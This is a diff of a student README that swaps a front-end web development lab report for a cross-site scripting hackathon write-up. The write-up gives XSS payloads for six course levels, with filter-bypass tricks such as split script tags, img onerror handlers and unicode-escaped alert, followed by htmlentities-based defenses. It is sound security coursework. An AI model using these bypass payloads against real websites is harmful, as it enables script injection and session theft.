@@ -12,234 +12,177 @@
 
 ## Repository Information
 Repository's URL: [https://github.com/BhargaviMurari22/waph-muraribi.git](https://github.com/BhargaviMurari22/waph-muraribi.git)
-## Lab2's Report:
-## Lab 2 - Front-end Web Development: 
 
-## The lab's overview and outcomes:
-The lab is divided into two sections: one covering forms in basic HTML and JavaScript, and the other covering AJAX, CSS, JQuery, and Web API connection. The first step entails building a simple HTML webpage with forms and sending data to an Echo.php file via the GET and POST methods in JavaScript. The form data is transmitted via AJAX and JQuery in the second section, and CSS is used to alter the HTML text both structurally and aesthetically. Using the attached GitHub link, access the lab materials: https://github.com/BhargaviMurari22/waph-muraribi/tree/main/labs/lab2
+## Hackathon 1 Report:
+## Overview and outcomes:
+The "Cross-site Scripting Attacks and Defenses" hackathon offers participants a thorough exploration of online application security, placing special emphasis on addressing the pervasive threat of cross-site scripting (XSS) attacks. Through hands-on lab exercises, attendees gain firsthand experience in understanding the risks associated with XSS vulnerabilities. These vulnerabilities pose serious threats to user data, session cookies, and the overall system integrity of web applications, allowing the injection and execution of scripts on legitimate web pages. The hackathon aims to empower participants with the knowledge and skills necessary to both exploit and defend against XSS vulnerabilities. The primary focus is on implementing robust defense strategies to significantly mitigate these risks. Using the attached GitHub link, access the lab materials: https://github.com/BhargaviMurari22/waph-muraribi/tree/main/labs/hackathon1
 
-### Task 1. Basic HTML with forms, and JavaScript
-# a. HTML
-I created a simple HTML webpage called "waph-muraribi.html" using Sublime Editor. The website has forms made with image and input tags, as well as a headshot. I was able to view the webpage on Mozilla Firefox by going to "localhost/waph-muraribi.html" after hosting the HTML file on the server with the "$sudo cp waph-muraribi.html /var/www/html" command.
-Following is the screenshot.
+### Task 1:
+# LEVEL 0:
+URL used: (http://waph-hackathon.eastus.cloudapp.azure.com/xss/level0/echo.php)
+Script used for attacking:
+```<script>alert("Level0: Hacked by BHARGAVI MURARI")</script>```
 
-![](imageslab2/img-1.png)
 
-![Waph-muraribi.html file opened in Mozilla Firefox after adding My Headshot using localhost/waph-muraribi.html](imageslab2/IMG-2.png)
 
-![Waph-muraribi.html file opened in Mozilla Firefox after creating a form](imageslab2/IMG-3.png)
+#LEVEL 1:
+URLused: (http://waph-hackathon.eastus.cloudapp.azure.com/xss/level1/echo.php)
+Script was written at the end of the URL as a path variable. The attacking script used was given below,
+ ```?input=<script>alert("Level 1: Hacked by BHARGAVI MURARI")</script>```
 
-This file was run since I utilized the Action method, made a GET request in the form, and set it to echo.php. html code for that can be found here:
 
- ```
- <b> Interaction with forms</b>
-		<div>
-			<i>Form with an HTTP GET Request</i>
-			<form action="echo.php" method="GET">
-				Your input: <input name="data">
-				<input type="submit" value="Submit">
-			</form>
-		</div>
+#LEVEL 2:
+URLused: (http://waph-hackathon.eastus.cloudapp.azure.com/xss/level2/echo.php)
+This HTTP request has been converted into a basic HTML form as it does not include an input field and does not allow a path variable. The employment of a hacking script is then made easier by the attacking script being guided through this form.
+```<script>alert("Level2 Hacked by BHARGAVI MURARI")</script>```
+Source Code Guess:
+```
+if(!isset($_POST['input'])){
+ die("{\"error\": \"Please provide 'input' field in an HTTP POST Request\"}");
+ } else {
+ echo $_POST['input'];
+ }
 ```
 
-![This is the final result that the user's browser shows once they click the submit button.](imageslab2/IMG-4.png)
+![](images/level2.png)
 
-![I added a new form for POST, which is shown in this screenshot. ](imageslab2/IMG-5.png)
+![Hacked Level2](images/level2.png)
 
-![Here is a quick description of what caused a POST request to be made](imageslab2/IMG-6.png)
-
-  b. Simple JavaScript
+#LEVEL 3:
+URLused: (http://waph-hackathon.eastus.cloudapp.azure.com/xss/level3/echo.php)
+This degree of security prevents the script tag from being directly entered into the input variable. To take use of this URL, the code was broken up into several pieces and connected to cause a warning to appear on the website.
+script tag used for attacking:
+```?input=<script<script>>alert("Level 3 Hacked by BHARGAVI MURARI")</scrip</script>t>```
+ Source code guess:
  
- ![I included inline JavaScript code into HTML elements to display the time and date as of right now. An example of how the inline script works is shown in a browser screenshot](imageslab2/IMG-7.png)
-
- A key push causes the digital clock to refresh. Here, I held down a key for a while before pressing it. The updated time is displayed in the given snapshot by means of a script tag.
-
-![](imageslab2/IMG-8.png)
-
-I used Sublime Editor to create a "email.js" file that contained my email embedded in an HTML file. A script element was then used to link the "email.js" file to the HTML file. I added a div tag with the content "<div id="email" onclick="showhideEmail()">show my email</div>} inside the HTML body element. As specified in the "email.js" file, the goal is to show or hide the email when the div is clicked.
-
-```
-var shown = false;
-function showhideEmail(){
-   if (shown) {
-     document.getElementById('email').innerHTML="show my email";
-     shown = false;
-   }
-   else {
-     var myemail= "<a href='mailto:muraribi"+"@"+"mail.uc.edu'>muraribi"+ "@"+"mail.uc.edu</a>"
-   document.getElementById('email').innerHTML=myemail;
-   shown = true;
-   }
- }
-``` 
-
-![The screenshot of the browser that shows the email hidden behind is below](imageslab2/IMG-9.png)
-
-![Here is an email screenshot that we can see by clicking on it](imageslab2/IMG-10.png)
-
-With the help of an external JavaScript code and the script tag, I have created an analog clock.
-The supplied library is shown below.
-
-```
-<script src="https://waph-uc.github.io/clock.js"></script>
-```
-
-Furthermore, below my photo, I've printed the analog clock. That code is as follows:
-
-```
-<canvas id="analog-clock" width="150" height="150" style="background-color:#999"></canvas>
-```
-
-![The automatically updating analog clock snapshot is shown here](imageslab2/IMG-11.png)
-
-### Task 2. Ajax, CSS, jQuery, and Web API integration
-a. Ajax:
- To collect user input and send it to "echo.php," I used Ajax (asynchronous JavaScript and XML), and I used XMLHttpRequest() to get the server response. The getEcho() function contains JavaScript code that, when a button is clicked, records user input. It makes an Ajax GET request to the "echo.php" web application, displaying the content of the response inside a designated div element.
+ Script tag may be substituted with a blank,
+ ```str_replace(['<script>', '</script>'], '', $input)```
  
- ```
-function getEcho() {
- var input= document.getElementById("data").value;
- if(input.length==0){
- return;
- }
- var xhttp= new XMLHttpRequest();
- xhttp.onreadystatechange=function(){
- if(this.readyState==4 && this.status==200){
- console.log("Received data="+ xhttp.responseText);
- document.getElementById("response").innerText="Response from server:"
- + xhttp.responseText;
- }
- }
- xhttp.open("GET", "Echo.php?data="+input,true);
- xhttp.send();
- document.getElementById("data").value="";
- 8
+![](images/level3.png)
+
+![Hacked Level3](images/level3.png)
+
+#LEVEL 4:
+URLused: (http://waph-hackathon.eastus.cloudapp.azure.com/xss/level4/echo.php)
+At this point, the script tag is fully filtered, thus it won't be able to be blocked even if the string is broken up and then joined together. Using the onerror() method of the tag to inject the XSS script allowed me to set off an alarm.
+Script tag used:
+```?input=<img%20src="..." onerror="alert(Level 4: Hacked by BHARGAVI MURARI)">```
+Code injected:
+```
+?input=<button onclick="alert('Level4')"></button>
+Source code guess:
+$data = $_GET['input'];
+if (preg_match('/<script\b[^>]*>(.*?)<\/script>/is', $data)) {
+exit('{"error": "No \'script\' is allowed!"}');
+} else {
+echo $data;
 }
 ```
+![](images/level4.png)
 
-Here are two screenshots of the Ajax answer in the console and web browser.
+![Hacked Level4](images/level4.png)
 
-![](imageslab2/IMG-12.png)
-
-![](imageslab2/IMG-13.png)
-
-Ajax requests are made to the server-side script "Echo.php" via the JavaScript function getEcho in response to user input. An XMLHttpRequest object is created for an asynchronous GET request to the server after it gathers user input from an HTML input element and validates it. The information received from the server is shown by the callback function through the recording of data to the console and the update of an HTML element's content with the id "response" to reflect the responses. This is an example of a standard Ajax flow, where user actions dynamically update webpage content without requiring a full page reload. After that, the input field gets cleared.
-
-
- b. CSS
- An HTML webpage's styling can be improved by using CSS (Cascading Style Sheets). I colored the buttons on the website by using the style tag. This is the tag I used for this styling, which is below.
-
- ```
-<style>
- .button {
- background-color: #4CAF50; /* Green */
- border: none;
- color: white;
- padding: 5px;
- text-align: center;
- text-decoration: none;
- display: inline-block;
- font-size: 12px;
- margin: 4px 2px;
- cursor: pointer;
+#LEVEL 5:
+URLused: (http://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php)
+Both the slert function and the tag are filtered at this level. I combined the button tag’s onerror function with unicode encoding to raise the popup alert.
+Code injected:
+```?input=<img src="invalid" onerror="\u0061lert(Level 5: Hacked By BHARGAVI MURARI)">```
+Source Code Guess:
+```
+$data = $_GET['input'];
+ if (preg_match('/<script\b[^>]*>(.*?)<\/script>/is', $data) || stripos($data, 'alert') !== false) {
+ exit('{"error": "No \'script\' is allowed!"}');
+ } else {
+ echo $data;
  }
- .round {border-radius: 8px;}
- #response {background-color: #ff9800;} /* Orange */
- </style>
-```
- To completely alter the webpage's structure, I have additionally used link tags. That is,
+ ```
+![](images/level5.png)
+
+![Hacked Level5](images/level4.png)
+
+#LEVEL 6:
+URLused: (http://waph-hackathon.eastus.cloudapp.azure.com/xss/level6/echo.php)
+This level still takes input even though I think the original code uses the htmlentities method to translate necessary characters into their correct HTML entities. As a result, the webpage shows user input as plain text. In certain situations, JavaScript eventListeners like onmouseover, onclick, onkeyup, and onmouseenter can be used to initiate an alert. In this case, every time a key is hit in the input field, the onmouseenter eventListener that I used triggers an alarm on the website. The input form element is altered when the script is inserted through the URL, as shown in the illustration below. It appends to the code.
 
  ```
- <link rel="stylesheet"
- href=https://waph-uc.github.io/style1.css>
-```
- The screenshot of the webpage browser with the Cascading style added is shown below.
-
- ![](imageslab2/IMG-14.png)
-
- ![](imageslab2/IMG-15.png)
-
- c. The jQuery
- I utilized the CDN to use the JQuery library, so
-
+<form action="/xss/level6/echo.php/" onkeyup="alert('Level 6 : Hacked by BHARGAVI MURARI')" method="POST">
+ Input:<input type="text" name="input" />
+ <input type="submit" name="Submit"/></form>
  ```
- <script src="https://code.jquery.com/jquery-3.7.1.min.js"
- integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
- crossorigin="anonymous"></script>
+Source Code Guess:
+```echo htmlentities($_REQUEST('input'));```
+
+![](images/level6.png)
+
+![Hacked Level6](images/level6.png)
+
+
+### Task 2.
+A. By adding code for input validation and editing the echo.php file, Lab 1's defensive measures against XSS were put into place. After a preliminary check to make sure the input is empty, PHP is stopped from running. When the input is verified as genuine, the htmlentities technique is used to clean it up. It then gets converted into the appropriate HTML characters so that it shows up on the page as text only.
+
+echo.php defence
  ```
-
- Using input tags, I created two buttons. To build routines that would activate when the buttons were clicked, I used JQuery. The buttons' HTML code can be found below.
- 
- ```
- <input class="button round" type="button" value="jQuery Ajax GET Echo" onclick="jQueryAjax()"
- <input class="button round" type="button" value="jQuery Ajax POST Echo" onclick="jQueryAjaxPost()"
-```
-
- i. Using an Ajax GET request, the JQueryAjax() method gathers user input and sends it to "echo.php." Additionally, the code uses JQuery to print the server answer. This is a sample of code that implements this capability.
-
-```
- function jQueryAjax() {
- var input = $("#data").val();
- if (input.length == 0) return;
- $.get("Echo.php?data="+input,
- function(result) {
- $("#response").html("Response from server:" + result);
- }
- );
- $("#data").val("");
- }
+<?php
+if(!isset($_REQUEST["data"])){ die("{\"error\": \"Please provide 'data' field\"}");
+}
+echo htmlentities($_REQUEST['data']);
+?>
 ```
 
-![This is a screenshot of the network properties following the click of the Ajax Get echo button](imageslab2/IMG-16.png)
+![](images/fig1.png)
 
- ii. Posting Ajax Requests To complete the identical task as above, I used the JQueryAjaxPOST() method. and for that, the code is as follows:
+![Revised echo.php with added defense mechanism](images/fig1.png)
 
- ```
- function jQueryAjaxPost() {
- var input = $("#data").val();
- if (input.length == 0) return;
- $.post("Echo.php",{data: input},
- function( result ) {
- $("#response").html("Response from server:" + result);
- }
- );
- $("#data").val("");
+B. Once external input points were identified, the waph-muraribi.html code underwent a significant change. After each of these inputs was verified, the result texts were edited.
+i) There is now validation applied to the input data for the HTTP GET and POST request forms. The request cannot be handled until the user input has been validated thanks to the introduction of a new function called validateInput.
+
+![](images/fig2.png)
+
+![waph-muraribi.html defense code](images/fig2.png)
+
+![](images/fig3.png)
+
+![Validating inputs](images/fig3.png)
+
+
+ii) InnerText was substituted for innerHTML in cases when the display was plain text and HTML rendering was not required.
+
+![](images/fig4.png)
+
+![Modified html to text](images/fig4.png)
+
+![](images/fig5.png)
+
+![Validated Output](images/fig5.png)
+
+ iii) To improve security by cleaning replies, a newly added function named encodeInput has been developed. To prevent cross-site scripting attacks, this entails transforming special characters into the proper HTML entities before adding them to the HTML content. As a result, the material is not executable and is handled as text only. InnerText is the material that is injected into a newly generated div element by the code. It is then given back as HTML content.
+```
+ function encodeInput(input){
+ const encodedData = document.createElement('div');
+ encodedData.innerText=input;
+ return encodedData.innerHTML;
  }
 ```
+![](images/fig6.png)
 
- ![The browser and console are shown in this screenshot of the Jquery post.](imageslab2/IMG-17.png)
+![Encode input function](images/fig6.png)
 
- Using the POST method guarantees that the requested data is not visible in the URL, in contrast to the GET method which exposes data in the URL. The POST method is typically chosen over GET because of its increased security.
+iv) Updates have been made to the joke retrieval API to guarantee the accuracy of the results that are received. New validations have been added, which verify that jokes in JSON are not empty. An error notice appears when the result is null.
 
- ![](imageslab2/IMG-18.png)
+![](images/fig8.png)
 
- d. Web API integration
- i. To send a request to the "https://v2.jokeapi.dev/joke/Programming?type=single" API, I used JQuery Ajax. The humorous portion of the API response will be extracted and shown by the JavaScript code. The snippet of code for this capability is shown below.
+![Defense to displaying joke](images/fig8.png)
 
- ```
-$.get("https://v2.jokeapi.dev/joke/Programming?type=single",function(result){
- console.log("from jokeapi:" + JSON.stringify(result));
- $("#response").html("Programming joke of day" + result.joke);
- })
+ v) It is confirmed that the asynchronous method guessAge’s received result
+ is either empty or non-zero. In addition, the data entered by the user is
+ checked to make sure it is not null or empty. An error notification appears
+ on each of these occasions.
 ```
-
- ![This is a screenshot of the console output that I took after looking at the code](imageslab2/IMG-19.png)
-
-  ii. I used the "https://api.agify.io/?name=input" retrieve API to display the age at random. After a user inputs their name and clicks the HTML "Guess Age" button, the age data is retrieved and displayed using the get API.
-
- ```
- <input class="button round" type="button" value="Guess age"
- onclick="guessAge($('#data').val())">
+if(result.age==null || result.age==0)
+return $("#response")
+.text("An error occured at this moment, So age cant be displayed");
+$("#response").text("Hello "+name+" ,your age should be "+result.age);
 ```
- When the Guessage() function is invoked, it appears as follows:
-  
- ```
-async function guessAge(name){
- const response =await fetch("https://api.agify.io/?name="+name);
- const result=await response.json();
- $("#response").html("Hi"+name + ",your age should be "+ result.age);
- }
-```
+![](images/fig9.png)
 
- ![This is an image of the output when the age data is shown here](imageslab2/IMG-20.png)
-
+![Validated Guess Age](images/fig9.png)
